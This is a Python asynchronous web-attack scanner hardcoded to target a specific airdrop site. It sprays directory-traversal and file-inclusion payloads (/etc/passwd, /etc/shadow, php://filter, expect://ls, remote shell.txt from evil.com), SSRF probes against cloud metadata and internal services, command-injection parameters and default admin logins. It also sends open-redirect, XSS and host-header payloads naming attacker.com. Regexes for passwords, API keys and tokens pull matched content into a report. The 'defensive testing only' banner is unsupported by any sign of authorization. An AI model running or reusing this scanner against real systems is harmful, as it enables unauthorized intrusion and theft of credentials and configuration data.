#!/usr/bin/env python3
"""
Alternative Access Explorer - Non-Login System Access Methods
Author: ShadowScan Security Team
Purpose: Explore alternative access paths, API endpoints, and vulnerabilities
"""

import asyncio
import aiohttp
import json
import random
import string
import time
import re
import base64
import hashlib
from datetime import datetime
from typing import Dict, List, Any, Optional
import urllib.parse

class AlternativeAccessExplorer:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = None
        self.access_token = None
        self.session_cookies = {}
        self.discovered_endpoints = []
        self.extracted_data = []
        self.vulnerabilities_found = []
        self.results = {
            "scan_info": {
                "target_url": target_url,
                "scan_timestamp": datetime.now().isoformat(),
                "scan_type": "Alternative Access Explorer",
                "scan_duration": "2-3 menit"
            },
            "summary": {
                "endpoints_discovered": 0,
                "data_extracted": 0,
                "vulnerabilities_found": 0,
                "alternative_access": []
            },
            "endpoints_discovered": [],
            "data_extracted": [],
            "vulnerabilities_found": [],
            "alternative_access": [],
            "recommendations": []
        }

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def explore_alternative_access(self):
        """Explore alternative access methods"""
        print("🔍 ALTERNATIVE ACCESS EXPLORER")
        print("=" * 60)
        print(f"🎯 Target: {self.target_url}")
        print("=" * 60)
        print("⚠️  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 60)

        # Execute alternative access methods
        await self.directory_traversal_exploitation()
        await self.information_leakage_analysis()
        await self.ssrf_exploitation()
        await self.websocket_exploration()
        await self.api_endpoint_enumeration()
        await self.misconfiguration_discovery()
        await self.protocol_anomaly_detection()

        # Generate final report
        await self.generate_explorer_report()

    async def directory_traversal_exploitation(self):
        """Directory traversal and file inclusion exploitation"""
        print("📁 Directory Traversal & File Inclusion")

        traversal_payloads = [
            # Directory traversal
            "../../../../etc/passwd",
            "../../..//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "....//....//....//etc//passwd",
            "....//....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd",

            # Windows paths
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts",
            "....\\....\\....\\windows\\system32\\drivers\\etc\\hosts",

            # File inclusion
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "php://filter/resource=index.php",
            "zip:///var/www/html/backup.zip",
            "phar:///var/www/html/backup.phar",
            "data:text/plain;base64,SGVsbG8sIFdvcmxkIQ==",
            "expect://ls",
            "file:///etc/passwd",
            "http://evil.com/shell.txt",
            "https://evil.com/shell.txt"
        ]

        # Endpoints vulnerable to traversal
        vulnerable_endpoints = [
            "/download",
            "/file",
            "/view",
            "/read",
            "/open",
            "/load",
            "/include",
            "/require",
            "/page",
            "/template",
            "/theme",
            "/config",
            "/settings",
            "/backup",
            "/restore",
            "/import",
            "/export",
            "/file-upload",
            "/file-download",
            "/file-viewer",
            "/document",
            "/report",
            "/invoice",
            "/receipt",
            "/attachment",
            "/media",
            "/image",
            "/picture",
            "/photo",
            "/video",
            "/audio",
            "/document",
            "/pdf",
            "/doc",
            "/docx",
            "/xls",
            "/xlsx",
            "/ppt",
            "/pptx",
            "/zip",
            "/rar",
            "/tar",
            "/gz",
            "/7z"
        ]

        for endpoint in vulnerable_endpoints:
            for payload in traversal_payloads:
                try:
                    success = await self._test_directory_traversal(endpoint, payload)
                    if success:
                        print(f"🔍 Directory Traversal Found: {endpoint} with {payload}")
                        self.results["vulnerabilities_found"].append({
                            "type": "directory_traversal",
                            "endpoint": endpoint,
                            "payload": payload,
                            "severity": "high"
                        })
                except Exception:
                    continue

    async def _test_directory_traversal(self, endpoint: str, payload: str) -> bool:
        """Test directory traversal vulnerability"""
        url = f"{self.target_url}{endpoint}"
        params = {"file": payload, "path": payload, "template": payload}

        # Test GET request
        try:
            async with self.session.get(url, params=params, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if any(keyword in content.lower() for keyword in ["root:", "daemon:", "bin:", "sys:", "wheel:"]):
                        return True
                    elif len(content) > 100 and "error" not in content.lower():
                        # Base64 decode check
                        try:
                            decoded = base64.b64decode(content).decode('utf-8')
                            if any(keyword in decoded.lower() for keyword in ["root:", "daemon:", "bin:", "sys:"]):
                                return True
                        except:
                            pass
        except Exception:
            pass

        # Test POST request
        try:
            async with self.session.post(url, data=params, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if any(keyword in content.lower() for keyword in ["root:", "daemon:", "bin:", "sys:", "wheel:"]):
                        return True
        except Exception:
            pass

        return False

    async def information_leakage_analysis(self):
        """Information leakage and metadata analysis"""
        print("🔒 Information Leakage Analysis")

        # Endpoints that might leak information
        info_endpoints = [
            # Configuration and metadata
            "/config",
            "/settings",
            "/api/config",
            "/api/settings",
            "/admin/config",
            "/admin/settings",
            "/system/config",
            "/system/settings",
            "/app/config",
            "/app/settings",

            # Debug and development
            "/debug",
            "/dev",
            "/development",
            "/test",
            "/testing",
            "/staging",
            "/stage",
            "/backup",
            "/backups",
            "/logs",
            "/var/log",
            "/tmp",
            "/temp",
            "/cache",
            "/tmp/cache",

            # Database related
            "/database",
            "/db",
            "/mysql",
            "/postgres",
            "/mariadb",
            "/sql",
            "/query",
            "/execute",
            "/adminer",
            "/phpmyadmin",
            "/mysqladmin",

            # Version and software info
            "/version",
            "/info",
            "/status",
            "/health",
            "/ping",
            "/metrics",
            "/stats",
            "/statistics",

            # User information
            "/users",
            "/users.json",
            "/user-list",
            "/user-data",
            "/profiles",
            "/profile-data",

            # API documentation
            "/docs",
            "/api-docs",
            "/swagger",
            "/openapi",
            "/api-reference",
            "/documentation",

            # Hidden files
            "/.env",
            "/.env.local",
            "/.env.production",
            "/.env.staging",
            "/.env.development",
            "/.env.example",
            "/.htaccess",
            "/.htpasswd",
            "/.git/config",
            "/.git/logs",
            "/.svn",
            "/.DS_Store",
            "/web.config",
            "/web.xml",
            "/crossdomain.xml",
            "/clientaccesspolicy.xml",

            # Error pages
            "/error",
            "/404",
            "/403",
            "/500",
            "/502",
            "/503",
            "/error.html",
            "/404.html",
            "/403.html",
            "/500.html",
            "/502.html",
            "/503.html"
        ]

        for endpoint in info_endpoints:
            try:
                url = f"{self.target_url}{endpoint}"
                async with self.session.get(url, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        if self._is_sensitive_content(content):
                            print(f"🔒 Information Leakage: {endpoint}")
                            self.results["data_extracted"].append({
                                "endpoint": endpoint,
                                "content": content[:500],  # Truncate for report
                                "type": "information_leakage"
                            })
            except Exception:
                continue

    def _is_sensitive_content(self, content: str) -> bool:
        """Check if content contains sensitive information"""
        sensitive_patterns = [
            r'password\s*[:=]\s*[\'"][^\'"]*[\'"]',
            r'secret\s*[:=]\s*[\'"][^\'"]*[\'"]',
            r'api[_-]?key\s*[:=]\s*[\'"][^\'"]*[\'"]',
            r'token\s*[:=]\s*[\'"][^\'"]*[\'"]',
            r'session\s*[:=]\s*[\'"][^\'"]*[\'"]',
            r'cookie\s*[:=]\s*[\'"][^\'"]*[\'"]',
            r'connection[_-]?string\s*[:=]\s*[\'"][^\'"]*[\'"]',
            r'database[_-]?url\s*[:=]\s*[\'"][^\'"]*[\'"]',
            r'private[_-]?key\s*[:=]\s*[\'"][^\'"]*[\'"]',
            r'public[_-]?key\s*[:=]\s*[\'"][^\'"]*[\'"]',
            r'ssl[_-]?cert\s*[:=]\s*[\'"][^\'"]*[\'"]',
            r'ssl[_-]?key\s*[:=]\s*[\'"][^\'"]*[\'"]'
        ]

        # Check for file paths
        file_patterns = [
            r'etc[/\\\\]passwd',
            r'etc[/\\\\]shadow',
            r'etc[/\\\\]hosts',
            r'etc[/\\\\]passwd',
            r'C:[/\\\\]Windows[/\\\\]System32',
            r'C:[/\\\\]Windows[/\\\\]win.ini',
            r'C:[/\\\\]Windows[/\\\\]system.ini'
        ]

        # Check for database credentials
        db_patterns = [
            r'mysql[_-]?:[_-]?.*:[_-]?.*@',
            r'postgres[_-]?:[_-]?.*:[_-]?.*@',
            r'sqlite[:=]\s*[\'"][^\'"]*[\'"]'
        ]

        # Check for API keys
        api_patterns = [
            r'[A-Za-z0-9]{20,}[_-][A-Za-z0-9]{20,}',
            r'sk-[A-Za-z0-9]{20,}',
            r'pk-[A-Za-z0-9]{20,}',
            r'AKIA[A-Za-z0-9]{16}',
            r'AIza[A-Za-z0-9]{35}',
            r'ya29[A-Za-z0-9\-_]{50,}'
        ]

        # Check for version information
        version_patterns = [
            r'nginx/[0-9.]+',
            r'apache/[0-9.]+',
            r'mysql/[0-9.]+',
            r'php/[0-9.]+',
            r'node[/][0-9.]+',
            r'python[/][0-9.]+'
        ]

        # Check for configuration files
        config_patterns = [
            r'database[_-]?config',
            r'app[_-]?config',
            r'system[_-]?config',
            r'settings[_-]?.*\.',
            r'config[_-]?.*\.'
        ]

        all_patterns = sensitive_patterns + file_patterns + db_patterns + api_patterns + version_patterns + config_patterns

        for pattern in all_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return True

        return False

    async def ssrf_exploitation(self):
        """Server-Side Request Forgery (SSRF) exploitation"""
        print("🌐 SSRF Exploitation")

        # SSRF payloads
        ssrf_payloads = [
            # Local network
            "http://127.0.0.1",
            "http://localhost",
            "http://127.0.0.1:80",
            "http://127.0.0.1:443",
            "http://127.0.0.1:3306",
            "http://127.0.0.1:5432",
            "http://127.0.0.1:6379",
            "http://127.0.0.1:27017",
            "http://localhost:80",
            "http://localhost:443",
            "http://127.0.0.1/anything",
            "http://[127.0.0.1]",

            # Internal network
            "http://192.168.1.1",
            "http://192.168.0.1",
            "http://10.0.0.1",
            "http://172.16.0.1",
            "http://169.254.0.1",
            "http://172.17.0.1",  # Docker default
            "http://host.docker.internal",

            # Cloud metadata
            "http://169.254.169.254",  # AWS metadata
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://169.254.169.254/openstack/latest/",
            "http://169.254.169.254/hetzner/"

            # Other internal services
            "http://database:3306",
            "http://mysql:3306",
            "http://postgres:5432",
            "http://redis:6379",
            "http://mongodb:27017",
            "http://elasticsearch:9200",
            "http://kafka:9092",
            "http://rabbitmq:5672",
            "http://consul:8500",
            "http://etcd:2379",
            "http://vault:8200",
            "http://grafana:3000",
            "http://prometheus:9090"
        ]

        # Endpoints vulnerable to SSRF
        ssrf_endpoints = [
            "/proxy",
            "/request",
            "/fetch",
            "/download",
            "/load",
            "/include",
            "/redirect",
            "/redirect-to",
            "/go",
            "/url",
            "/link",
            "/fetch-url",
            "/fetch-data",
            "/load-data",
            "/include-url",
            "/proxy-url",
            "/redirect-url",
            "/visit",
            "/browse",
            "/open",
            "/stream",
            "/webhook",
            "/callback",
            "/notify",
            "/webhook-url",
            "/callback-url"
        ]

        for endpoint in ssrf_endpoints:
            for payload in ssrf_payloads:
                try:
                    success = await self._test_ssrf(endpoint, payload)
                    if success:
                        print(f"🌐 SSRF Found: {endpoint} -> {payload}")
                        self.results["vulnerabilities_found"].append({
                            "type": "ssrf",
                            "endpoint": endpoint,
                            "payload": payload,
                            "severity": "high"
                        })
                except Exception:
                    continue

    async def _test_ssrf(self, endpoint: str, payload: str) -> bool:
        """Test SSRF vulnerability"""
        url = f"{self.target_url}{endpoint}"
        params = {"url": payload, "target": payload, "host": payload}

        # Test GET request
        try:
            async with self.session.get(url, params=params, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if any(keyword in content.lower() for keyword in ["amazonaws", "compute/v1", "meta-data", "instance-id", "ami-id"]):
                        return True
                    elif any(keyword in content.lower() for keyword in ["localhost", "127.0.0.1", "192.168.", "10.", "172."]):
                        return True
                    elif "error" not in content.lower() and len(content) > 50:
                        return True
        except Exception:
            pass

        # Test POST request
        try:
            async with self.session.post(url, data=params, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if any(keyword in content.lower() for keyword in ["amazonaws", "compute/v1", "meta-data", "instance-id", "ami-id"]):
                        return True
        except Exception:
            pass

        return False

    async def websocket_exploration(self):
        """WebSocket and real-time communication exploration"""
        print("🔌 WebSocket Exploration")

        # WebSocket endpoints
        websocket_endpoints = [
            "/ws",
            "/websocket",
            "/socket",
            "/socket.io",
            "/ws/",
            "/websocket/",
            "/socket/",
            "/socket.io/",
            "/realtime",
            "/real-time",
            "/live",
            "/stream",
            "/events",
            "/notifications",
            "/chat",
            "/messaging",
            "/broadcast",
            "/push",
            "/subscribe",
            "/listen"
        ]

        # WebSocket messages to test
        ws_messages = [
            {"type": "auth", "token": "admin_token"},
            {"type": "message", "content": "test"},
            {"type": "command", "cmd": "whoami"},
            {"type": "admin", "action": "dashboard"},
            {"type": "login", "username": "admin", "password": "admin"},
            {"type": "request", "data": "config"},
            {"type": "subscribe", "channel": "admin"},
            {"type": "subscribe", "channel": "users"},
            {"type": "subscribe", "channel": "config"},
            {"type": "subscribe", "channel": "logs"},
            {"type": "get", "resource": "admin"},
            {"type": "get", "resource": "users"},
            {"type": "get", "resource": "config"},
            {"type": "get", "resource": "logs"},
            {"type": "access", "target": "admin"},
            {"type": "access", "target": "dashboard"},
            {"type": "access", "target": "config"}
        ]

        for endpoint in websocket_endpoints:
            try:
                await self._test_websocket(endpoint, ws_messages)
            except Exception:
                continue

    async def _test_websocket(self, endpoint: str, messages: List[Dict[str, str]]):
        """Test WebSocket connection"""
        url = f"{self.target_url.replace('http://', 'ws://').replace('https://', 'wss://')}{endpoint}"

        try:
            async with self.session.ws_connect(url, timeout=10) as ws:
                # Send test messages
                for message in messages:
                    await ws.send_json(message)

                    # Wait for response
                    response = await ws.receive_json(timeout=5)

                    # Check for interesting responses
                    if isinstance(response, dict):
                        if any(key in response for key in ["admin", "dashboard", "config", "users", "auth"]):
                            print(f"🔌 WebSocket Response: {endpoint}")
                            self.results["alternative_access"].append({
                                "type": "websocket",
                                "endpoint": endpoint,
                                "message": message,
                                "response": response,
                                "status": "responsive"
                            })
                        elif response.get("status") == "success" or response.get("message"):
                            print(f"🔌 WebSocket Success: {endpoint}")
                            self.results["alternative_access"].append({
                                "type": "websocket",
                                "endpoint": endpoint,
                                "message": message,
                                "response": response,
                                "status": "success"
                            })
        except Exception:
            pass

    async def api_endpoint_enumeration(self):
        """API endpoint enumeration and exploration"""
        print("🔌 API Endpoint Enumeration")

        # Comprehensive API endpoint list
        api_endpoints = [
            # REST API endpoints
            "/api",
            "/api/v1",
            "/api/v2",
            "/api/v3",
            "/rest",
            "/rest/v1",
            "/rest/v2",
            "/graphql",
            "/graphql/v1",

            # Resource-specific endpoints
            "/api/users",
            "/api/admins",
            "/api/sessions",
            "/api/auth",
            "/api/tokens",
            "/api/config",
            "/api/settings",
            "/api/database",
            "/api/backup",
            "/api/logs",
            "/api/metrics",
            "/api/health",
            "/api/status",
            "/api/version",
            "/api/info",

            # GraphQL endpoints
            "/graphql",
            "/graphql/",
            "/api/graphql",
            "/api/graphql/",

            # GraphQL introspection
            "/graphql?query={__schema{types{name,kind}}}",
            "/graphql?query={__schema{queryType{name}}}",
            "/graphql?query={__type(name:\"Query\"){name,fields{name}}}",
            "/graphql?query={__schema{mutationType{name}}}",

            # GraphQL schema
            "/graphql?query=query{__schema{types{name,description,kind,fields{name,args{name,type{name}}}}}}",

            # Documentation endpoints
            "/api/docs",
            "/api/docs/",
            "/api/documentation",
            "/api/documentation/",
            "/swagger",
            "/swagger.json",
            "/swagger.yaml",
            "/openapi",
            "/openapi.json",
            "/openapi.yaml",

            # GraphQL playground
            "/graphql-playground",
            "/graphql-playground/",
            "/graphiql",
            "/graphiql/",
            "/playground",
            "/playground/",

            # GraphQL IDE
            "/graphql-ide",
            "/graphql-ide/",
            "/ide",
            "/ide/",

            # GraphQL console
            "/graphql-console",
            "/graphql-console/",
            "/console",
            "/console/"
        ]

        # API test parameters
        api_params = [
            {"action": "get", "resource": "admin"},
            {"action": "get", "resource": "config"},
            {"action": "get", "resource": "users"},
            {"action": "get", "resource": "database"},
            {"action": "read", "resource": "admin"},
            {"action": "read", "resource": "config"},
            {"action": "read", "resource": "users"},
            {"action": "read", "resource": "database"},
            {"query": "SELECT * FROM users"},
            {"query": "SELECT * FROM admin"},
            {"query": "SELECT * FROM config"},
            {"query": "SELECT * FROM database"},
            {"command": "whoami"},
            {"command": "id"},
            {"command": "pwd"},
            {"command": "ls -la"},
            {"cmd": "whoami"},
            {"cmd": "id"},
            {"cmd": "pwd"},
            {"cmd": "ls -la"},
            {"exec": "whoami"},
            {"exec": "id"},
            {"exec": "pwd"},
            {"exec": "ls -la"},
            {"run": "whoami"},
            {"run": "id"},
            {"run": "pwd"},
            {"run": "ls -la"}
        ]

        for endpoint in api_endpoints:
            for params in api_params:
                try:
                    success = await self._test_api_endpoint(endpoint, params)
                    if success:
                        print(f"🔌 API Endpoint Found: {endpoint}")
                        self.results["alternative_access"].append({
                            "type": "api",
                            "endpoint": endpoint,
                            "params": params,
                            "status": "responsive"
                        })
                except Exception:
                    continue

    async def _test_api_endpoint(self, endpoint: str, params: Dict[str, str]) -> bool:
        """Test API endpoint"""
        url = f"{self.target_url}{endpoint}"

        # Test GET request
        try:
            async with self.session.get(url, params=params, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if len(content) > 20 and "error" not in content.lower():
                        return True
                elif response.status == 401 or response.status == 403:
                    # Authentication required - might be interesting
                    return True
        except Exception:
            pass

        # Test POST request
        try:
            async with self.session.post(url, json=params, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if len(content) > 20 and "error" not in content.lower():
                        return True
        except Exception:
            pass

        return False

    async def misconfiguration_discovery(self):
        """Misconfiguration discovery"""
        print("⚠️ Misconfiguration Discovery")

        # Misconfigurations to test
        misconfigurations = [
            # Open redirects
            {"redirect": "javascript:alert('XSS')"},
            {"redirect": "data:text/html,<script>alert('XSS')</script>"},
            {"redirect": "file:///etc/passwd"},
            {"redirect": "ftp://attacker.com/steal"},
            {"redirect": "http://evil.com/steal"},

            # CORS misconfigurations
            {"origin": "http://evil.com"},
            {"origin": "http://localhost:3000"},
            {"origin": "http://127.0.0.1:3000"},
            {"origin": "file://"},
            {"origin": "null"},

            # Host header injection
            {"host": "attacker.com"},
            {"host": "localhost:3000"},
            {"host": "127.0.0.1:3000"},
            {"host": "airdrop.0gfoundation.evil.com"},

            # Referer header injection
            {"referer": "http://evil.com"},
            {"referer": "http://localhost:3000"},
            {"referer": "http://127.0.0.1:3000"},

            # User-Agent injection
            {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"},
            {"user-agent": "curl/7.68.0"},
            {"user-agent": "python-requests/2.25.1"},
            {"user-agent": "Apache-HttpClient/4.5.13"},

            # Content-Type manipulation
            {"content-type": "application/x-www-form-urlencoded"},
            {"content-type": "text/plain"},
            {"content-type": "application/xml"},
            {"content-type": "multipart/form-data"},
            {"content-type": "application/json"},

            # Accept header manipulation
            {"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"},
            {"accept": "application/json"},
            {"accept": "text/plain"},
            {"accept": "*/*"},
            {"accept": "application/xml"},
            {"accept": "application/x-www-form-urlencoded"}
        ]

        # Endpoints to test
        misconfig_endpoints = [
            "/redirect",
            "/callback",
            "/webhook",
            "/oauth",
            "/auth",
            "/login",
            "/api",
            "/rest",
            "/graphql",
            "/admin",
            "/dashboard"
        ]

        for endpoint in misconfig_endpoints:
            for misconfig in misconfigurations:
                try:
                    success = await self._test_misconfiguration(endpoint, misconfig)
                    if success:
                        print(f"⚠️ Misconfiguration Found: {endpoint}")
                        self.results["vulnerabilities_found"].append({
                            "type": "misconfiguration",
                            "endpoint": endpoint,
                            "payload": misconfig,
                            "severity": "medium"
                        })
                except Exception:
                    continue

    async def _test_misconfiguration(self, endpoint: str, misconfig: Dict[str, str]) -> bool:
        """Test misconfiguration"""
        url = f"{self.target_url}{endpoint}"

        try:
            async with self.session.get(url, params=misconfig, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if "evil.com" in content.lower() or "localhost" in content.lower():
                        return True
        except Exception:
            pass

        return False

    async def protocol_anomaly_detection(self):
        """Protocol anomaly detection"""
        print("🔍 Protocol Anomaly Detection")

        # Test various protocols
        protocols = [
            # File protocols
            "file:///etc/passwd",
            "file:///etc/hosts",
            "file:///etc/shadow",
            "file:///proc/self/environ",
            "file:///C:/Windows/win.ini",
            "file:///C:/Windows/system.ini",
            "file:///C:/Windows/System32/drivers/etc/hosts",

            # Data protocols
            "data:text/html,<script>alert('XSS')</script>",
            "data:text/plain,Hello World",
            "data:application/json,{\"test\": \"data\"}",
            "data:application/octet-stream,AAAAAA",

            # Custom protocols
            "javascript:alert('XSS')",
            "vbscript:msgbox('XSS')",
            "jar:file:///tmp/exploit.jar!/",
            "chrome://settings/",
            "chrome://extensions/",
            "about:config",
            "about:blank",
            "about:plugins",
            "about:cache",

            # Other protocols
            "ftp://attacker.com/steal",
            "ftps://attacker.com/steal",
            "sftp://attacker.com/steal",
            "ldap://attacker.com",
            "ldaps://attacker.com",
            "gopher://attacker.com",
            "telnet://attacker.com",
            "ssh://attacker.com",
            "irc://attacker.com",
            "ircs://attacker.com",
            "sip://attacker.com",
            "sips://attacker.com",
            "rsync://attacker.com",
            "tftp://attacker.com"
        ]

        # Endpoints to test
        protocol_endpoints = [
            "/url",
            "/link",
            "/fetch",
            "/download",
            "/load",
            "/include",
            "/proxy",
            "/request",
            "/redirect",
            "/visit",
            "/browse",
            "/open",
            "/stream",
            "/play",
            "/view",
            "/display",
            "/show",
            "/render"
        ]

        for endpoint in protocol_endpoints:
            for protocol in protocols:
                try:
                    success = await self._test_protocol_anomaly(endpoint, protocol)
                    if success:
                        print(f"🔍 Protocol Anomaly: {endpoint} -> {protocol}")
                        self.results["vulnerabilities_found"].append({
                            "type": "protocol_anomaly",
                            "endpoint": endpoint,
                            "protocol": protocol,
                            "severity": "medium"
                        })
                except Exception:
                    continue

    async def _test_protocol_anomaly(self, endpoint: str, protocol: str) -> bool:
        """Test protocol anomaly"""
        url = f"{self.target_url}{endpoint}"
        params = {"url": protocol, "target": protocol, "link": protocol}

        try:
            async with self.session.get(url, params=params, timeout=10) as response:
                if response.status == 200:
                    content = await response.text()
                    if any(keyword in content.lower() for keyword in ["xss", "alert", "javascript", "data:", "file:"]):
                        return True
                    elif len(content) > 100 and "error" not in content.lower():
                        return True
        except Exception:
            pass

        return False

    async def generate_explorer_report(self):
        """Generate final explorer report"""
        report_filename = f"alternative_access_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        # Update summary
        self.results["summary"]["endpoints_discovered"] = len(self.results["endpoints_discovered"])
        self.results["summary"]["data_extracted"] = len(self.results["data_extracted"])
        self.results["summary"]["vulnerabilities_found"] = len(self.results["vulnerabilities_found"])

        # Add recommendations
        if self.results["summary"]["vulnerabilities_found"] > 0:
            self.results["recommendations"] = [
                "Vulnerabilities found through alternative access methods",
                "Immediate security assessment required",
                "Patch identified vulnerabilities",
                "Implement proper input validation",
                "Enable security headers",
                "Regular security audits recommended"
            ]
        else:
            self.results["recommendations"] = [
                "No vulnerabilities found through alternative access testing",
                "Security posture appears robust",
                "Consider regular security assessments",
                "Monitor for new vulnerabilities"
            ]

        with open(report_filename, 'w') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\n🔍 ALTERNATIVE ACCESS SUMMARY:")
        print(f"   Endpoints Discovered: {self.results['summary']['endpoints_discovered']}")
        print(f"   Data Extracted: {self.results['summary']['data_extracted']}")
        print(f"   Vulnerabilities Found: {self.results['summary']['vulnerabilities_found']}")
        print(f"   Alternative Access Points: {len(self.results['summary']['alternative_access'])}")

        print(f"\n📋 Report: {report_filename}")
        print("🔍 ALTERNATIVE ACCESS EXPLORATION COMPLETED! 🔍")

async def main():
    target_url = "https://airdrop.0gfoundation.ai"

    async with AlternativeAccessExplorer(target_url) as explorer:
        await explorer.explore_alternative_access()

if __name__ == "__main__":
    asyncio.run(main())